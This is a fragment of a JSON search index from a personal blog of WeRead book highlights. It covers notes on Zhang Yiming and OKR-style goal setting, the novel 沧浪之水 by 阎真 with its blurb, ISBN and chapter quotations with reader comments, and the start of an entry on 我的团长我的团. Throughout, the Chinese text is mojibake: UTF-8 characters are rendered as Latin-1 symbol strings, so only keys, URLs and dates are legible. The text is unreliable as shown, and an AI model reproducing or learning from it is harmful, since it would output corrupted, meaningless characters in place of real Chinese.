åŒ…æ‹¬äººã€ç»„ç»‡ã€å·¥å…·å’Œå…±è¯†ï¼Œå…¶ä¸­æœ€ä¸ºåŸºç¡€çš„ç¡¬ä»¶æ˜¯å·¥å…·ï¼Œæé«˜æ²Ÿé€šå·¥å…·çš„æ€§èƒ½ï¼Œè®©æ‰€æœ‰äººæ²‰æµ¸åœ¨ä¿¡æ¯é«˜é€Ÿæµé€šçš„æ°›å›´ä¸­ï¼Œä¿¡æ¯ç¯å¢ƒå°±èƒ½æœ€å¤§åŒ–å‘æ˜ä¸ªäººå’Œç»„ç»‡çš„èƒ½åŠ›ï¼Œå½¢æˆé›†ä½“å…±è¯†ï¼Œæ¨åŠ¨æ›´ä¸ºé«˜æ•ˆçš„å†³ç­–ä¸æ‰§è¡Œã€‚ â€” åˆ›å»ºäº [[2023-09-05]] 23:07 ^51-6313-6416 æ¯ä¸ªäººéƒ½æ˜¯å·¥ä½œèŠ‚ç‚¹ æ¯ä¸ªäººéƒ½æ˜¯å·¥ä½œèŠ‚ç‚¹ ç›¸æ¯”KPIé‡è§†è€ƒæ ¸å’Œæ¿€åŠ±ï¼ŒOKRæ›´é‡è§†ç›®æ ‡ç®¡ç†ã€‚è¿™ä¸€ä½“ç³»è¦æ±‚å‘˜å·¥é¦–å…ˆæ¸…æ¥šç›®æ ‡ï¼Œå…¶æ¬¡å¯¹å…³é”®ç»“æœè¿›è¡Œå¯é‡åŒ–çš„å®šä¹‰ï¼Œæœ€ååˆ™æ˜¯æ‰§è¡Œå®ç°ã€‚å…¶ä¸­ï¼Œå…³é”®ç»“æœçš„å¯é‡åŒ–å®šä¹‰æœ€ä¸ºé‡è¦ï¼Œä¾‹å¦‚ï¼Œâ€œä½¿Ã—Ã—äº§å“è¾¾åˆ°æˆåŠŸâ€ï¼Œå¹¶éå…³é”®ç»“æœçš„åˆæ ¼æè¿°ï¼Œâ€œä½¿Ã—Ã—äº§å“åœ¨7æœˆä¸Šçº¿ï¼Œå¹¶åœ¨10æœˆæ—¶æ‹¥æœ‰150ä¸‡ç”¨æˆ·â€æ‰æ˜¯ã€‚ â€” åˆ›å»ºäº [[2023-09-05]] 23:09 ^52-1821-1960 åšæ­£ç¡®çš„äº‹ï¼Œè€Œä¸æ˜¯å®¹æ˜“çš„äº‹ åšæ­£ç¡®çš„äº‹ï¼Œè€Œä¸æ˜¯å®¹æ˜“çš„äº‹ äººä»¬å·²ä¹ æƒ¯äºå¯¹ä¼˜ç§€ä¼ä¸šå®¶ä»¬é¡¶ç¤¼è†œæ‹œï¼Œå°†ä»–ä»¬çš„æ•…äº‹çœ‹æˆå¥‡è¿¹ã€‚ç„¶è€Œï¼Œå•†ä¸šä¸–ç•Œé‡Œå¹¶æ²¡æœ‰ä»€ä¹ˆå¥‡è¿¹ï¼Œæœ‰çš„åªæ˜¯ä¿¡æ¯ä¸å¯¹ç§°å¸¦æ¥çš„è¯¯è§£ã€‚å¾ˆå¤šäººåœ¨æƒ³ç€ä»€ä¹ˆæ ·çš„ç”Ÿæ´»å’Œå·¥ä½œæ–¹å¼ï¼Œæ‰èƒ½æ›´å®¹æ˜“ã€æ›´è½»æ¾æ—¶ï¼Œå¼ ä¸€é¸£å´æ•¢äºå¹¶ä¸»åŠ¨ä»¥ç‹¬ç«‹æ€è€ƒçš„å§¿æ€ï¼Œæ‰“ç ´ä¿¡æ¯ä¸å¯¹ç§°ï¼Œé€‰æ‹©æœ€æ­£ç¡®çš„åˆ›ä¸šæ–¹å‘ã€‚è€Œå½“ç«äº‰è€…ä¹ æƒ¯äºè·¯å¾„ä¾èµ–æ—¶ï¼Œå¼ ä¸€é¸£å´åœ¨ä¸æ–­è¿½æ±‚æ­£ç¡®ï¼Œè·³å‡ºä¹ ä»¥ä¸ºå¸¸çš„æ€ç»´æ¡†æ¶ã€‚ â€” åˆ›å»ºäº [[2023-09-06]] 07:38 ^55-2064-2228 åšæ­£ç¡®çš„äº‹ï¼Œè€Œä¸æ˜¯å®¹æ˜“çš„äº‹ ç‹¬ç«‹æ€è€ƒã€è¿½æ±‚æ­£ç¡®ï¼Œç»éç®€å•çš„äº‹æƒ…ï¼Œå…¶ä¸­å……æ–¥ç€è‰°éš¾ä¹ƒè‡³åäººæ€§çš„æ­¥éª¤ã€‚ â€” åˆ›å»ºäº [[2023-09-06]] 07:38 ^55-2427-2461 è‡ªçœçš„åŒæ—¶ï¼Œä¹Ÿè¦å¤§åŠ›å‡ºå¥‡è¿¹ è‡ªçœçš„åŒæ—¶ï¼Œä¹Ÿè¦å¤§åŠ›å‡ºå¥‡è¿¹ å¾ˆå°‘æˆ–è€…æ²¡æœ‰äººèƒ½å¤Ÿç»™è‡ªå·±æå‡ºæœ‰æ•ˆçš„è¦æ±‚å’Œæ‰¹è¯„æ—¶ï¼Œè‡ªå·±çš„è‡ªçŸ¥ã€è‡ªåˆ¶åŠ›å’Œåçœå˜å¾—å°¤ä¸ºé‡è¦ï¼Œèƒ½ä»è½»å¾®çš„æ„è§å’Œå¼‚å¸¸ä¸­å‘ç°è‡ªå·±çš„é—®é¢˜å¹¶ä¿®æ­£ï¼Œæ˜¯ä¸€ç§æ…ç‹¬ã€‚ â€” åˆ›å»ºäº [[2023-09-06]] 07:42 ^57-1586-1657 è‡ªçœçš„åŒæ—¶ï¼Œä¹Ÿè¦å¤§åŠ›å‡ºå¥‡è¿¹ åœ¨å¼ ä¸€é¸£çš„é€»è¾‘ä¸­ï¼Œå‘ç«æ˜¯å·æ‡’ï¼Œæ˜¯åˆ©ç”¨æƒ…ç»ªå®£æ³„æ¥ç»‘æ¶äº‹æƒ…çš„è¿›å±•ï¼Œè€Œå…¬å¼€è´£æ€ªä¸‹å±æ‰§è¡ŒåŠ›ä¸å¤Ÿï¼Œå®é™…ä¸Šä¹Ÿæ˜¯CEOæ‰¿è®¤è‡ªå·±çš„é¢†å¯¼åŠ›å·®ã€‚ â€” åˆ›å»ºäº [[2023-09-06]] 07:44 ^57-1937-1999 é€ƒé€¸å¹³åº¸ï¼Œæ–¹å¯æŠµè¾¾ä¸å‡¡ é€ƒé€¸å¹³åº¸ï¼Œæ–¹å¯æŠµè¾¾ä¸å‡¡ æ²¡æœ‰è¾¹ç•Œï¼Œæºäºè‡ªæˆ‘ä¸è®¾ç•Œã€‚å¼ ä¸€é¸£çš„å¾®åšé‡Œæœ‰ä¸€å¥è¯ï¼šâ€œå¹³åº¸æœ‰é‡åŠ›ï¼Œéœ€è¦é€ƒé€¸é€Ÿåº¦ã€‚â€æ‰€è°“çš„é€ƒé€¸é€Ÿåº¦ï¼Œåœ¨ç™¾åº¦ç™¾ç§‘ä¸­çš„è§£é‡Šæ˜¯äººé€ å¤©ä½“æ— åŠ¨åŠ›è„±ç¦»åœ°çƒå¼•åŠ›æŸç¼šæ‰€éœ€çš„æœ€å°é€Ÿåº¦ã€‚å¯¹å¹³åº¸ï¼Œå¼ ä¸€é¸£åˆ™ä¸“é—¨è§£é‡Šè¿‡ï¼šâ€œä¸ç”˜äºå¹³åº¸å¾ˆé‡è¦ã€‚æˆ‘è¯´ä¸å¹³åº¸ï¼Œå¹¶ä¸æ˜¯ä¸“é—¨æŒ‡è–ªé…¬è¦å¾ˆé«˜æˆ–è€…æŠ€æœ¯å¾ˆå¥½ï¼Œè€Œæ˜¯ä½ å¯¹è‡ªå·±çš„æ ‡å‡†ä¸€å®šè¦é«˜ã€‚ä¹Ÿè®¸ä½ å‰2å¹´å˜åŒ–å¾—æ…¢ï¼Œä½†10å¹´åå†çœ‹ï¼Œè‚¯å®šä¼šéå¸¸ä¸ä¸€æ ·ã€‚â€ â€” åˆ›å»ºäº [[2023-09-06]] 07:53 ^61-503-675 é€ƒé€¸å¹³åº¸ï¼Œæ–¹å¯æŠµè¾¾ä¸å‡¡ åˆ«äººçš„æˆåŠŸæ‰“ä¹±èŠ‚å¥ï¼Œè€Œæ˜¯è€å¿ƒåšè‡ªå·±ï¼Œè¿™æ˜¯å¯¹å¯‚å¯æœ€å¥½çš„æ€åº¦ï¼Œä¹Ÿé¿å…äº†å› ä¸ºåˆ†å¿ƒè€Œå¯¼è‡´çš„å¹³åº¸ â€” åˆ›å»ºäº [[2023-09-06]] 07:55 ^61-1630-1673 å¼ ä¸€é¸£åè¨€å½• å¼ ä¸€é¸£åè¨€å½• å­¤ç‹¬æŒºå¥½çš„ï¼Œç»å¸¸æ˜¯çµæ„Ÿå’Œå®é™çš„æ¥æºï¼Œæœ‰å®¶åº­çš„äººåªèƒ½åˆ›é€ å­¤ç‹¬çš„ç¯å¢ƒã€‚ â€” åˆ›å»ºäº [[2023-09-07]] 15:26 ^66-1182-1215 å¼ ä¸€é¸£åè¨€å½• å…³äºéœ€æ±‚çš„é—®é¢˜æœ‰ï¼šâ€œæ²¡çœ‹åˆ°çš„é—®é¢˜â€å’Œâ€œæ²¡çœŸæ­£æƒ³çœ‹çš„é—®é¢˜â€ï¼Œåè€…å…¶å®æ›´æœ¬è´¨ä¸€äº›ã€‚â—â€œå¾ˆæƒ³æŠŠè®¾è®¡å¾—æ›´å¥½çš„æˆ–èƒ½åšå¥½çš„åšå‡ºæ¥â€ï¼Œä»æŠ€æœ¯çš„è§’åº¦æ˜¯ä¸é”™çš„ï¼Œä½†ä»äº§å“è§’åº¦å°±æ˜¯é”¤å­æƒ³æ‰¾é’‰å­ã€‚â—åšäº§å“ç¡®å®æ˜¯åäººæ€§çš„ï¼Œä¸€æ¿€åŠ¨ä¸€ç´§å¼ ï¼Œå°±æ— æ³•ä½“ä¼šç”¨æˆ·çš„æ„Ÿå—äº†ï¼Œå¹¶ä¸”å®¹æ˜“è‡ªæˆ‘å¼ºåŒ–ã€è½»è§†ç”¨æˆ·ã€‚æ—¢è¦æ”¾æ¾ï¼Œåˆè¦æ•æ„Ÿä¸æ¼ã€‚æœ€åï¼Œå³ä½¿æƒ³æ¸…æ¥šäº†ï¼Œè¿˜è¦èƒ½ä¿æŒè‰¯å¥½ã€åˆé€‚çš„èŠ‚å¥ã€‚ â€” åˆ›å»ºäº [[2023-09-07]] 15:21 ^66-5298-5523","tags":[{"name":"weread","slug":"weread","permalink":"https://hodlyounger.github.io/tags/weread/"},{"name":"å¾®ä¿¡è¯»ä¹¦","slug":"å¾®ä¿¡è¯»ä¹¦","permalink":"https://hodlyounger.github.io/tags/%E5%BE%AE%E4%BF%A1%E8%AF%BB%E4%B9%A6/"}],"categories":[{"name":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/"},{"name":"weread","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/"},{"name":"ç»æµç†è´¢","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/ç»æµç†è´¢","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/%E7%BB%8F%E6%B5%8E%E7%90%86%E8%B4%A2/"}]},{"title":"æ²§æµªä¹‹æ°´","date":"2024-08-31T01:35:29.362Z","path":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/ç²¾å“å°è¯´/æ²§æµªä¹‹æ°´-é˜çœŸ/","text":"ä½œè€…ï¼šé˜çœŸ - å†…å®¹ç®€ä»‹ ã€Šæ²§æµªä¹‹æ°´ã€‹ è¿™æ˜¯ä¸€éƒ¨ä»¤äººæƒŠéª‡çš„å°è¯´ï¼Œæœ‰ä¸€ç§é“ç ´å¤©æœºçš„æ„å‘³ã€‚ä½œè€…ä»¥çŠ€åˆ©å¦‚åˆ€çš„æ–‡ç¬”å’Œç”ŸåŠ¨é€¼çœŸçš„æå†™ï¼Œå†™å‡ºçœå«ç”Ÿå…å…¬åŠ¡å‘˜ã€åŒ»è¯å­¦ç ”ç©¶ç”Ÿæ± å¤§ä¸ºä»æ— èŒæ— æƒã€ç©ºæ€€å£®å¿—ï¼Œåˆ°æ—¶æ¥è¿è½¬ã€å¤§å±•å®å›¾çš„è¿‡ç¨‹ã€‚é…¸ç”œè‹¦è¾£çš„äººç”Ÿå†µå‘³ï¼Œé™©è±¡ç¯ç”Ÿçš„å‡è¿ä¹‹è·¯ï¼ä½ æ­»æˆ‘æ´»çš„çµé­‚ææ–—ï¼Œäººæƒ…å†·æš–ä¸–æ€ç‚å‡‰ï¼Œæ— ä¸å¤ºäººå¿ƒé­„ã€å‘äººæ·±æ€ã€‚æ¯ä¸ªäººéƒ½èƒ½ä»ä¹¦ä¸­çœ‹åˆ°ç¤¾ä¼šï¼Œæ‰¾åˆ°è‡ªå·±çš„å½±å­ã€‚æ­¤ä¹¦å£ç¢‘çˆ†æ£šï¼Œæ˜¯è¿‘åä½™å¹´æ¥å”¯ä¸€æŒç»­ç•…é”€çš„å½“ä»£ä½œå®¶åŸåˆ›é•¿ç¯‡å°è¯´ä¹‹ä¸€ï¼Œå·²ç”±äººæ°‘æ–‡å­¦å‡ºç‰ˆç¤¾å†ç‰ˆäº†66æ¬¡ï¼Œé”€é‡ç ´ç™¾ä¸‡ã€‚æ­¤ä¹¦å·²æ”¹ç¼–æˆç”µè§†å‰§ã€Šå²æœˆã€‹ï¼Œç”±èƒ¡å†›ã€æ¢…å©·ã€äºå’Œä¼Ÿã€ç‹å½¤ä¸»æ¼”ã€‚ æ²§æµªä¹‹æ°´ + ã€Šæ²§æµªä¹‹æ°´ã€‹ å±æ€§ å†…å®¹ ISBN 9787020082926 ä½œè€… é˜çœŸ å‡ºç‰ˆå¹´ 2001-10-01 å‡ºç‰ˆç¤¾ äººæ°‘æ–‡å­¦å‡ºç‰ˆç¤¾ æ¥æº æ²§æµªä¹‹æ°´ åˆ†ç±» ç²¾å“å°è¯´-ç¤¾ä¼šå°è¯´ é«˜äº®åˆ’çº¿ ç¬¬28ç«  ç¬¬28ç«  ç”Ÿå­˜æ˜¯ç¡¬é“ç†ï¼Œæ˜¯å½’å®¿ï¼Œæ˜¯ä¸€åˆ‡ã€‚æ¡æ¡é“è·¯é€šç½—é©¬ï¼Œç½—é©¬æ˜¯è‡ªæˆ‘ï¼Œæ˜¯ç”Ÿå­˜ï¼Œæ˜¯æ´»ç€ã€‚è¿™æ˜¯çœŸç›¸ï¼Œè¿™æ˜¯æœ¬è´¨ï¼Œè¿™æ˜¯æ‚Ÿè€…ä¹‹æ‚Ÿï¼Œæ™ºè€…ä¹‹æ™ºã€‚ â€” åˆ›å»ºäº [[2021-08-18]] 21:11 ^30-2570-2629 ç¬¬34ç«  ç¬¬34ç«  ä¸€æ—¶é—´æˆ‘ä¼¼ä¹å¤§å½»å¤§æ‚Ÿï¼Œè§‰å¾—çˆ¶äº²é‚£ä¸€è¾ˆå­å¤ªä¸å€¼å¾—ï¼Œä»–çš„ç‰ºç‰²æ¯«æ— æ„ä¹‰ã€‚æˆ‘å¿ƒä¸­æµ®ç°å‡ºçˆ¶äº²çš„èº«å½±ï¼Œåœ¨é‚£äº›é¥è¿œçš„å¤œæ™šï¼Œä»–ååœ¨æ²¹ç¯ä¸‹å‡ ä¸ªå°æ—¶ä¸€åŠ¨ä¸åŠ¨ï¼Œå¢™ä¸Šæ˜ å‡ºä»–é‚£ä¼¼ä¹å‡¹è¿›å¢™å£çš„å½±å­ã€‚æƒ³åˆ°è¿™äº›ï¼Œæˆ‘çš„èº«å­çŒ›åœ°æŠ–äº†ä¸€ä¸‹ã€‚ â€” åˆ›å»ºäº [[2021-08-18]] 23:07 ^36-2061-2162 å®³ï¼Œå‰æ–‡é‚£ä¹ˆå¤šè½¬æŠ˜ç‚¹æˆ‘éƒ½ä»¥ä¸ºä½ æ± å¤§ä¸ºè¦è½¬è¿‡æ¥äº†ï¼Œåˆ°è¿™äº†ä½ æ‰æ‚Ÿäº†ã€‚ ç¬¬35ç«  ç¬¬35ç«  é€‚ç”Ÿ â€” åˆ›å»ºäº [[2021-08-18]] 23:47 ^37-1440-1442 ç¬¬42ç«  ç¬¬42ç«  å®—æ•™æ˜¯å¼±è€…çš„å®‰æ…°ï¼Œæ˜¯èµ°æŠ•æ— è·¯ä¸­çš„é“è·¯ã€‚è€Œä¸”ï¼Œäººæ€»æ˜¯è¦æ­»å»çš„ï¼Œå®—æ•™æ˜¯é€šå¾€æ°¸æ’çš„å”¯ä¸€é“è·¯ã€‚å› æ­¤ï¼Œç¥åœ£æ€§ä¸æ˜¯ä»ä¸Šå¸å¼€å§‹çš„ï¼Œè€Œæ˜¯ä»äººä»¬å¯¹ä¸Šå¸çš„éœ€è¦å¼€å§‹çš„ï¼Œäººä»¬éœ€è¦ä¸€ä¸ªç¥è¯ã€‚ â€” åˆ›å»ºäº [[2021-08-22]] 22:37 ^44-2388-2470 ç¬¬83ç«  ç¬¬83ç«  åœ¨é‚£é‡Œæ‰æœ‰æˆåŠŸï¼Œè€ŒæˆåŠŸå°±æ˜¯ä¸€åˆ‡ï¼Œåˆ«çš„è¯´ä»€ä¹ˆéƒ½å˜å¾—æ„ä¹‰æš§æ˜§ï¼Œæˆä¸ºå¤šä½™ã€‚åœ¨ä¸–çºªæœ«çš„äººç”Ÿä¹‹æ—…ä¸­ï¼Œæˆ‘ä»¬ä¸çŸ¥ä¸è§‰å°±è¿›å…¥äº†è¿™æ ·çš„å¢ƒåœ°ï¼Œè¿™ç®€ç›´å°±æ˜¯å†å²çš„å®‰æ’ï¼Œè€Œä¸ªäººä¸è¿‡æ˜¯è¢«ç”Ÿå­˜çš„æœ¬èƒ½æ¨ç€èµ°ç½¢äº†ã€‚æˆ‘ä»¬åœ¨ä¸çŸ¥ä¸è§‰ä¹‹ä¸­å¤±å»äº†ç²¾ç¥çš„æ ¹åŸºï¼Œæˆä¸ºäº†æ‚¬æµ®ä¸€æ—ã€‚æˆ‘ä»¬åœ¨éšæ³¢é€æµä¹‹ä¸­å˜æˆäº†æ–°å‹çš„çŸ¥è¯†åˆ†å­ï¼Œæ²¡æœ‰ä¹‰ä¸å®¹è¾çš„ä½¿å‘½æ„è¯†ï¼Œæ²¡æœ‰å¤©ä¸‹åƒç§‹çš„æ‰¿æ‹…æƒ…æ€€ï¼Œæ²¡æœ‰æµèŠ³åƒå¤çš„è™šå¦„å¹»æƒ³ã€‚æ—¶ä»£ç»™äº†æˆ‘ä»¬è¶³å¤Ÿçš„æ™ºæ…§çœ‹æ¸…äº‹æƒ…çš„çœŸç›¸ï¼Œå› è€Œæˆ‘ä»¬ä¹Ÿä¸å†å‘è‡ªå·±è™šæ„ç¥åœ£é¢„è®¾ç»ˆæï¼Œä¸å†å»è¿½æ±‚é‚£ç§ä¸å¯èƒ½çš„å¯èƒ½æ€§ã€‚æˆ‘ä»¬æ˜¯èƒœåˆ©çš„å¤±è´¥è€…ï¼Œåˆæ˜¯å¤±è´¥çš„èƒœåˆ©è€…ï¼Œæ˜¯å„’é›…çš„ä¿—äººï¼Œåˆæ˜¯åº¸ä¿—çš„é›…äººã€‚æˆ‘ä»¬ä»¥å‰è¾ˆçš„æ–¹å¼è¯´è¯ï¼Œä½†æœ¬è´¨ä¸Šå´æ²¡æœ‰åŠ›é‡è¶…å‡ºç”Ÿå­˜è€…çš„å¢ƒç•Œã€‚å¯¹ä¸–ç•Œæˆ‘ä»¬ä»€ä¹ˆéƒ½ä¸æ˜¯ï¼Œå¯¹è‡ªå·±å°±æ˜¯ä¸€åˆ‡ï¼Œæˆ‘ä»¬è¢«è¿™ç§æ®‹é…·çš„çœŸå®å‡»è´¥äº†ï¼Œä»å†…éƒ¨è¢«å‡»è´¥äº†ã€‚æˆ‘ä»¬æ²¡æœ‰åŠ›é‡é¢å¯¹é‚£äº›ä¸¥å³»çš„è¯é¢˜ï¼Œå…³äºèº«ä»½ï¼Œå…³äºçµé­‚ï¼Œäºæ˜¯æ€¯æ‡¦è€Œè™šä¼ªåœ°è®¾æƒ³é‚£äº›é—®é¢˜å¹¶ä¸å­˜åœ¨ï¼Œç”Ÿå­˜æ‰æ˜¯å”¯ä¸€çš„çœŸå®ã€‚æˆ‘ä»¬æ›¾ç»æ‹¥æœ‰ç»ˆæï¼Œè€Œç»ˆçº§åœ¨ä»Šå¤©å·²ç»å˜æˆäº†æˆ‘ä»¬è‡ªå·±ã€‚ç”Ÿå‘½çš„æ„ä¹‰ä¹‹æºçªç„¶ä¸­æ–­ï¼Œæ¢¦æƒ³æˆä¸ºæ¢¦æƒ³ï¼Œæˆ‘ä»¬æˆä¸ºæ— æºä¹‹æ°´æ— æœ¬ä¹‹æœ¨ï¼Œæˆä¸ºæ°¸è¿œçš„ç²¾ç¥æµæµªè€…ã€‚å¤©ä¸‹åƒç§‹å·²ç»æ¸ºè¿œï¼Œè‡ªå·±è¿™ä¸€è¾ˆå­å´å¦‚æ­¤çœŸå®ã€‚å½“ä¸€å·±ä¹‹ç¬é—´æˆä¸ºå¤©ä¸‹ä¹‹æ°¸æ’ï¼Œæˆ‘ä»¬å°±ä¸ä¹è§‚ä¸»ä¹‰ä½œäº†æœ€åçš„è¯€åˆ«ï¼Œæ¯•ç«Ÿï¼Œäººåªèƒ½åœ¨è‡ªèº«ä¹‹å¤–è€Œä¸å¯èƒ½ä»¥è‡ªå·±ä¸ºç›®æ ‡å»ºæ„å´‡é«˜ï¼Œå»ºæ„å½¢è€Œä¸Šçš„æ„ä¹‰ä¸–ç•Œã€‚æ‚²å‰§åœ¨æ—¶é—´çš„å·¨æŒä¸­å·²ç»æ³¨å®šï¼Œæˆ‘ä»¬è¿˜æ²¡æ¥å¾—åŠç»†æƒ³å°±è¿›å…¥äº†é“ºå°±çš„è½¨é“ã€‚å¯¹æˆ‘ä»¬è€Œè¨€ï¼Œè¿™ä¸ªäº‹å®åªèƒ½æ¥å—ï¼Œè€Œæ— é¡»è®¨è®ºä¹Ÿæ— æ³•æŠ—æ‹’ã€‚ â€” åˆ›å»ºäº [[2021-08-25]] 00:05 ^85-1159-1758 ç¬¬13ç«  â€” åˆ›å»ºäº [[2021-08-17]] 17:18 ^291189470-7sCPUtaNH æœ¬æ¥å¯¹ä¹¦åæŒºå¥½å¥‡ï¼Œæ²¡æƒ³åˆ°è¿™ç«Ÿç„¶è¿˜æŒºå‡ºåï¼Œè¢«ç¿»æ‹ç”µè§†å‰§ã€Šå²æœˆã€‹ã€‚ æ®ä¼ ï¼Œæ­¦æ±‰å¤§å­¦ä¸€ä½å¾·é«˜æœ›é‡çš„è€æ•™æˆï¼Œåœ¨ç»™ä»–ä»¬ä¸Šæœ€åä¸€èŠ‚è¯¾æ—¶ï¼Œæ¨èäº†è¿™æœ¬ä¹¦ã€‚ è€æ•™æˆè¯´ï¼šâ€œåŒå­¦ä»¬ï¼Œå››å¹´æ¥ï¼Œæˆ‘ä¸€ç›´æ•™å¯¼ä½ ä»¬ï¼Œè¦æªå®ˆåšäººçš„å‡†åˆ™ï¼Œè¦è‡ªå¼ºä¸æ¯ã€ä¸¥ä»¥å¾‹å·±ã€ç‹¬ç«‹æ€è€ƒï¼Œè¦ä¸è¶‹ç‚é™„åŠ¿ï¼Œè¦åšæŒå®äº‹æ±‚æ˜¯ã€‚ä½†æ˜¯ï¼Œä»Šå¤©ï¼Œä½œä¸ºä½ ä»¬çš„å¯¼å¸ˆï¼Œæˆ‘è¦å®è¯å®è¯´ï¼Œåœ¨ä½ ä»¬èµ°ä¸Šç¤¾ä¼šåï¼Œè¿™äº›å¯èƒ½éƒ½æ˜¯é”™çš„ã€‚æœ€åä¸€è¯¾ï¼Œæˆ‘è¦æ¨èä½ ä»¬å¥½å¥½è¯»ä¸€éƒ¨ä¹¦ã€‚è¿™éƒ¨ä¹¦å¯ä»¥è¯´å¾ˆåï¼Œå¸¦åäº†å‡ åƒä¸‡çŸ¥è¯†åˆ†å­ï¼Œä½†æ˜¯è¿™éƒ¨ä¹¦åˆå¾ˆå¥½ï¼Œä»–è®©å‡ åƒä¸‡äººé¿å…äº†èµ°æ­ªè·¯ï¼Œè·å¾—äº†ä¸–ä¿—ä¸Šçš„æˆåŠŸã€‚â€ â€œä»Šåçš„è·¯ï¼Œå°±æ˜¯ä½ ä»¬è‡ªå·±èµ°äº†ï¼Œå¥½å¥½çœ‹çœ‹è¿™éƒ¨ä¹¦å§ï¼Œé€‰æ‹©ä¸€æ¡è‡ªå·±çš„è·¯ã€‚ä½œä¸ºå¤§å­¦ï¼Œå³å‡ºä¸–ï¼Œä¹Ÿå…¥ä¸–ã€‚â€ ç¬¬34ç«  ä¸€æ—¶é—´æˆ‘ä¼¼ä¹å¤§å½»å¤§æ‚Ÿï¼Œè§‰å¾—çˆ¶äº²é‚£ä¸€è¾ˆå­å¤ªä¸å€¼å¾—ï¼Œä»–çš„ç‰ºç‰²æ¯«æ— æ„ä¹‰ã€‚æˆ‘å¿ƒä¸­æµ®ç°å‡ºçˆ¶äº²çš„èº«å½±ï¼Œåœ¨é‚£äº›é¥è¿œçš„å¤œæ™šï¼Œä»–ååœ¨æ²¹ç¯ä¸‹å‡ ä¸ªå°æ—¶ä¸€åŠ¨ä¸åŠ¨ï¼Œå¢™ä¸Šæ˜ å‡ºä»–é‚£ä¼¼ä¹å‡¹è¿›å¢™å£çš„å½±å­ã€‚æƒ³åˆ°è¿™äº›ï¼Œæˆ‘çš„èº«å­çŒ›åœ°æŠ–äº†ä¸€ä¸‹ã€‚ â€” åˆ›å»ºäº [[2021-08-18]] 23:10 ^291189470-7sEJg7sfL å®³ï¼Œå‰æ–‡é‚£ä¹ˆå¤šè½¬æŠ˜ç‚¹æˆ‘éƒ½ä»¥ä¸ºä½ æ± å¤§ä¸ºè¦è½¬è¿‡æ¥äº†ï¼Œåˆ°è¿™äº†ä½ æ‰æ‚Ÿäº†ã€‚ ç¬¬42ç«  ã€‚å®—æ•™æ˜¯å¼±è€…çš„å®‰æ…°ï¼Œæ˜¯èµ°æŠ•æ— è·¯ä¸­çš„é“è·¯ã€‚è€Œä¸”ï¼Œäººæ€»æ˜¯è¦æ­»å»çš„ï¼Œå®—æ•™æ˜¯é€šå¾€æ°¸æ’çš„å”¯ä¸€é“è·¯ã€‚å› æ­¤ï¼Œç¥åœ£æ€§ä¸æ˜¯ä»ä¸Šå¸å¼€å§‹çš„ï¼Œè€Œæ˜¯ä»äººä»¬å¯¹ä¸Šå¸çš„éœ€è¦å¼€å§‹çš„ï¼Œäººä»¬éœ€è¦ä¸€ä¸ªç¥è¯ã€‚ â€” åˆ›å»ºäº [[2021-08-22]] 22:31 ^291189470-7sKLVCFDY ä¸€å¥è¯è¯´é€äº†äº†å®—æ•™èµ·æº ç¬¬43ç«  é•‡å‹ï¼Œé•‡å‹ï¼Œä½ ä»¥ä¸ºä½ æ˜¯è°ï¼Œä¸€æ¡â€”â€”è™«ï¼Œè¿˜æƒ³åæŠ—ï¼Ÿ â€” åˆ›å»ºäº [[2021-08-20]] 00:14 ^291189470-7sGjK8tlc é€‚ç”Ÿçš„æ‰¹åˆ¤ä¸è‡ªæˆ‘æ‰¹åˆ¤","tags":[{"name":"weread","slug":"weread","permalink":"https://hodlyounger.github.io/tags/weread/"},{"name":"å¾®ä¿¡è¯»ä¹¦","slug":"å¾®ä¿¡è¯»ä¹¦","permalink":"https://hodlyounger.github.io/tags/%E5%BE%AE%E4%BF%A1%E8%AF%BB%E4%B9%A6/"}],"categories":[{"name":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/"},{"name":"weread","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/"},{"name":"ç²¾å“å°è¯´","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/ç²¾å“å°è¯´","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/%E7%B2%BE%E5%93%81%E5%B0%8F%E8%AF%B4/"}]},{"title":"æˆ‘çš„å›¢é•¿æˆ‘çš„å›¢ï¼ˆæ®µå¥•å®ã€å¼ è¯‘ç­‰äººä¸»æ¼”ï¼‰","date":"2024-08-31T01:35:29.358Z","path":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/ç²¾å“å°è¯´/æˆ‘çš„å›¢é•¿æˆ‘çš„å›¢ï¼ˆæ®µå¥•å®ã€å¼ è¯‘ç­‰äººä¸»æ¼”ï¼‰-å…°æ™“é¾™/","text":"ä½œè€…ï¼šå…°æ™“é¾™ - å†…å®¹ç®€ä»‹ ã€Šæˆ‘çš„å›¢é•¿æˆ‘çš„å›¢ï¼ˆæ®µå¥•å®ã€å¼ è¯‘ç­‰äººä¸»æ¼”ï¼‰ã€‹ ä¸­ç¼…è¾¹å¢ƒçš„ç¦…è¾¾ï¼Œä¸€ç¾¤å›½æ°‘å…šæºƒå…µå’Œç™¾å§“å› 